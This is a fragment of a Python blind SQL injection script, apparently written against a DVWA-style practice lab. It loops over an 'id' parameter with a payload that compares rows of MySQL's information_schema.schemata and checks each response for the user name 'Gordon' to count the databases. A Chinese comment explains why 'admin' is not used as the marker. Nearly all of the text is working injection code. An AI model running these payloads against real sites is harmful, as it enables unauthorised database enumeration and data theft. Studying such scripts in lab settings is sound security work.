...
for i in range(0, 999):
    params1={"id":"2' and  (table information_schema.schemata limit {},1) >=('def',' ',0,0,0,0)-- ".format(i),"Submit":"Submit"}
    header = {
    ...
    # print(r1.text)
    if "Gordon" not in r1.text:  #不要用admin  因为页面最左下角就有admin 使用admin登陆的
        print("数据库数量为:",i)
        break